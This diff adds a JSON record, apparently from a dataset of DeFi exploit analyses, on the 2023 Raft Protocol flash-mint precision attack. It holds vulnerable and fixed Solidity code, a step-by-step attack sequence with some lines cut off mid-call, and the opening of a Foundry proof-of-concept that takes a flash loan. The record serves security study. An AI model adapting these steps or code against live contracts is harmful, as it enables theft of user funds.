@@ -1,0 +1,51 @@
+{
+ "id": "2023__2023-11-10_Raft_FlashMintPrecision_ETH",
+ "source_file": "2023/2023-11-10_Raft_FlashMintPrecision_ETH.md",
+ "title": "Raft Protocol — Flash Mint Precision Attack Analysis",
+ "date": "2023-11-10",
+ "protocol": "Raft Protocol",
+ "chain": "Ethereum",
+ "loss_raw": "~$3,300,000 (1,577 ETH extracted; ~6,701,624 R minted at face value; confirmed by CoinDesk, Raft post-mortem)",
+ "loss_usd": 3300000.0,
+ "root_cause": "cbETH donation inflates the rcbETH-c index → precision loss causes excessive rcbETH-c minting per 1 wei cbETH → excess R stablecoin issuance using over-collateralized position",
+ "attack_tx": "0xfeed...ce7",
+ "vulnerable_contract": "0x9ab6...c244 (PRM)",
+ "classes": [
+  "integer-precision"
+ ],
+ "code_before": [
+  "// ❌ Vulnerable code — ERC20Indexable.mint()\nfunction mint(address to, uint256 amount) external override {\n    // amount: actual quantity of cbETH deposited (in wei)\n    // currentIndex: cumulative multiplier of cbETH value per 1 share\n    // shares = amount * 1e18 / currentIndex\n    // ⚠️ Issue: when currentIndex is inflated to a very large number,\n    //           amount=1 wei → shares = 1e18 / (2.994e37) ≈ 0\n    //           However, since Solidity uses integer division the result should be 0,\n    //           but the internal implementation uses ceiling division (round up), yielding 1\n    uint256 shares = amount.mulDivUp(1e18, currentIndex()); // ❌ ceiling division\n    _mint(to, shares);\n}",
+  "// ❌ Vulnerable code — index update logic (estimated reproduction)\nfunction _updateIndex(IERC20Indexable collToken) internal {\n    uint256 totalAssets = IERC20(collateral).balanceOf(address(this));\n    uint256 totalShares = collToken.totalSupply();\n\n    if (totalShares == 0) return;\n\n    // ⚠️ If totalShares is very small and totalAssets is very large,\n    //    newIndex = totalAssets * 1e18 / totalShares explodes\n    uint256 newIndex = totalAssets.mulDiv(INDEX_PRECISION, totalShares);\n    // ❌ No validation on the maximum rate of change relative to the previous index\n    collToken.setIndex(newIndex);\n}",
+  "// ❌ Vulnerable code — managePosition() missing minimum deposit validation\nfunction managePosition(\n    IERC20 collateralToken,\n    address position,\n    uint256 collateralChange,  // ⚠️ even 1 wei is accepted\n    bool isCollateralIncrease,\n    uint256 debtChange,\n    bool isDebtIncrease,\n    uint256 maxFeePercentage,\n    ERC20PermitSignature calldata permitSignature\n) external returns (uint256, uint256) {\n    // ❌ Processes as long as collateralChange > 0 — 1 wei passes through\n    if (isCollateralIncrease && collateralChange > 0) {\n        _increaseCollateral(position, collateralChange);\n    }\n    // ...\n}"
+ ],
+ "code_after": [
+  "// ✅ Fixed code — add minimum deposit validation\nfunction mint(address to, uint256 amount) external override {\n    uint256 index = currentIndex();\n    // ✅ Enforce a minimum deposit relative to the index to block 1 wei attacks\n    // amount * 1e18 / index >= 1 must hold → amount >= index / 1e18\n    require(amount >= index / 1e18, \"Deposit amount too small\");\n    uint256 shares = amount.mulDiv(1e18, index); // ✅ Remove ceiling division (use floor)\n    _mint(to, shares);\n}",
+  "// ✅ Fixed code — limit maximum rate of index change\nfunction _updateIndex(IERC20Indexable collToken) internal {\n    uint256 totalAssets = IERC20(collateral).balanceOf(address(this));\n    uint256 totalShares = collToken.totalSupply();\n\n    if (totalShares == 0) return;\n\n    uint256 newIndex = totalAssets.mulDiv(INDEX_PRECISION, totalShares);\n    uint256 oldIndex = collToken.currentIndex();\n\n    // ✅ Block if the index changes by more than 2x in a single transaction\n    require(newIndex <= oldIndex * 2, \"Index change rate exceeded\");\n    collToken.setIndex(newIndex);\n}"
+ ],
+ "steps": [
+  "1. cbETH.transfer(PRM, 6001.45 cbETH)",
+  "→ Donate cbETH directly to PRM contract",
+  "2. PRM.liquidate(liquidablePosition)",
+  "→ Trigger liquidation: recalculate",
+  "→ Index: 2.25e34 → 6.74e37 (~2,994x inflation)",
+  "→ Deposit 1 wei cbETH",
+  "→ mulDivUp(1 wei, 1e18, 6.74e37) = 1 (ceil)",
+  "→ Mint 1 rcbETH-c share",
+  "~dozens of iterations →",
+  "3. PRM.managePosition(cbETH, self, PRM_balance,",
+  "→ Withdraw full 6,003.44 cbETH donated earlier",
+  "4. PRM.managePosition(cbETH, self, 0, true,",
+  "→ Mint 6,705,028 R against inflated",
+  "[PHASE 4] Swap R → ETH/cbETH to Realize Profits",
+  "5. Swap 200,000 R in R/USDC Uniswap V3 pool",
+  "→ Receive 2,009,226 sDAI",
+  "6. Swap 1,200,000 R → DAI",
+  "7. DAI → WETH (Uniswap V3)",
+  "8. Unwrap WETH → ETH",
+  "9. Curve cbETH/ETH pool: 5 ETH → 4.74 cbETH"
+ ],
+ "other_code": [
+  "┌─────────────────────────────────────────────────────┐\n│  Attacker Contract (0x0a33...ef8)                    │\n│  Request flash loan of 6,000 cbETH from AaveV3       │\n└──────────────────────┬──────────────────────────────┘\n                       │ Receive 6,000 cbETH\n                       ▼\n┌─────────────────────────────────────────────────────┐\n│  [PHASE 1] Index Inflation                           │\n│                                                     │\n│  1. cbETH.transfer(PRM, 6001.45 cbETH)              │\n│     → Donate cbETH directly to PRM contract         │\n│       (donate attack)                               │\n│                                                     │\n│  2. PRM.liquidate(liquidablePosition)               │\n│     → Trigger liquidation: recalculate              │",
+  "// ===== [Step 1] Initial Test Conditions =====\nfunction testExploit() external {\n    // Start with 1.5 cbETH and 3,405 R\n    deal(address(cbETH), address(this), 1.5 ether);\n    deal(address(R), address(this), 3405 ether);\n\n    // Directly mint rcbETH-d to satisfy the minimum debt requirement (3,000 R)\n    // by impersonating PRM\n    vm.startPrank(address(PRM));\n    rcbETH_d.mint(address(this), 3100 ether);\n    vm.stopPrank();\n\n    // Request a flash loan of 6,000 cbETH from AaveV3\n    aaveV3.flashLoan(address(this), assets, amounts, modes, address(this), \"\", 0);\n}\n\n// ===== [Step 2] Core Attack Logic Inside Flash Loan Callback =====\nfunction executeOperation(...) external returns (bool) {\n    // [2-1] Record current index before attack\n    uint256 storedindex1 = rcbETH_c.currentIndex();\n "
+ ]
+}
